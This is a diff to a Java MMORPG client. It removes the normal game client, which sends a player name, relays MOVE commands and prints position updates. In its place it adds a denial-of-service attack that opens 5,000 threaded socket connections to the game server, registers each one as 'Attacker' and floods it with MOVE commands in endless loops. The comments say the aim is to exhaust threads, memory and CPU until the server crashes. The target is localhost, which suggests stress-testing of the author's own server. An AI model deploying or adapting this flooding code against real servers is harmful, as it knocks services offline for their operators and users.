@@ -7,39 +7,31 @@ public class MMORPGClient {
     private static final int SERVER_PORT = 12345;
 
     void main() {
-        try (Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
-             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
-             BufferedReader consoleInput = new BufferedReader(new InputStreamReader(System.in))) {
-
-            System.out.println(in.readLine());
-            String playerName = consoleInput.readLine();
-            out.println(playerName);
-
+        // Combined attack: Many connections + continuous broadcast spam
+        // This exhausts threads, memory, and CPU simultaneously
+        for (int i = 0; i < 5000; i++) {
+            final int id = i;
             new Thread(() -> {
-                String serverMessage;
                 try {
-                    while ((serverMessage = in.readLine()) != null) {
-                        if (serverMessage.startsWith("UPDATE:")) {
-                            String[] parts = serverMessage.split(":");
-                            String otherPlayerName = parts[1];
-                            String positionData = parts[2];
-                            System.out.println(otherPlayerName + " is now at " + positionData);
-                        }
+                    Socket socket = new Socket("localhost", 12345);
+                    BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
+
+                    in.readLine(); // Read prompt
+                    out.println("Attacker" + id); // Register with unique name
+
+                    // Spam MOVE commands continuously to trigger broadcasts
+                    while (true) {
+                        out.println("MOVE:x" + id + ",y" + id);
                     }
-                } catch (IOException e) {
-                   throw new RuntimeException(e);
-                }
+                } catch (Exception e) {}
             }).start();
 
-            String userInput;
-            while((userInput = consoleInput.readLine()) != null) {
-                if (userInput.startsWith("MOVE:")) {
-                    out.println(userInput);
-                }
+            if (i % 100 == 0) {
+                System.out.println("Launched " + i + " attack threads");
             }
-        } catch (IOException e) {
-            throw new RuntimeException(e);
         }
+
+        System.out.println("Attack launched - server should crash");
     }
 }
